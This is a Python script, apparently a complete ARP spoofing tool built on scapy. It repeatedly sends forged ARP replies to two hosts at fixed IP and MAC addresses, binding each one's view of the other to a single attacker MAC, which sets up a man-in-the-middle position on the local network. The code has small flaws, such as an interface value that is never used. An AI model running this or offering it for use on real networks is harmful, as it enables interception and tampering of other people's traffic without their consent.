import platform
from scapy.all import ARP, Ether, sendp

def get_interface():
    system = platform.system()
    if system == "Windows":
        # On Windows, use the default interface
        return None  # Scapy automatically selects the appropriate interface
    elif system == "Linux":
        # On Linux, specify the interface name (e.g., "enp0s8")
        return "Wi-Fi"  # Change this to your desired interface
    else:
        raise Exception("Unsupported operating system")

def send_arp_reply(source_ip, source_mac, target_ip, target_mac):
    arp_reply = Ether(dst=target_mac)/ARP(op=2, psrc=source_ip, hwsrc=source_mac, pdst=target_ip, hwdst=target_mac)
    sendp(arp_reply, verbose=False)

if __name__ == "__main__":
    # Specify the network interface
    interface = get_interface()

    # Specify the IP addresses and MAC addresses
    source_ip1 = "10.134.254.56"
    source_mac = "08:00:27:AA:76:DB"
    target_ip1 = "10.134.253.72"
    target_mac1 = "98:43:fa:32:d9:da"

    source_ip2 = "10.134.253.72"
    target_ip2 = "10.134.254.56"
    target_mac2 = "90:0f:0c:e6:5e:27"

    # Send the ARP reply packets
    while True:
        send_arp_reply(source_ip1, source_mac, target_ip1, target_mac1)
        send_arp_reply(source_ip2, source_mac, target_ip2, target_mac2)
